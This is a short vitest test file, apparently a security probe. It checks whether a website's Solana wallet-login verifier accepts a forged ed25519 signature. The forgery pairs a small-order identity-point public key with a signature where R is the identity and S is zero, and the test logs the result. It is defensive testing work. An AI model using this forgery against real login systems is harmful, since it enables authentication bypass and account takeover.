import { it, expect } from 'vitest';
import { verifyLogin } from '../../../../../website/api/_swingsAuth.js';
import { loginMessage } from '../../../../../website/src/swings/account/loginMessage.js';
const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
const b58 = (b: Uint8Array) => { let n = 0n; for (const x of b) n = n * 256n + BigInt(x); let s = ''; while (n > 0n) { s = B58[Number(n % 58n)] + s; n /= 58n; } for (const x of b) { if (x) break; s = '1' + s; } return s; };
it('ed25519 small-order key accepts a forged signature', () => {
  const id = new Uint8Array(32); id[0] = 1; // identity point
  const address = b58(id);
  const NOW = 1_800_000_000_000;
  const message = loginMessage({ family: 'solana', address, domain: 'aretiafinance.org', issuedAt: NOW, nonce: 'b'.repeat(32) });
  const sig = new Uint8Array(64); sig[0] = 1; // R = identity, S = 0
  const r = verifyLogin({ message, signature: Buffer.from(sig).toString('base64'), domain: 'aretiafinance.org', now: NOW });
  console.log('small-order', address, JSON.stringify(r));
});
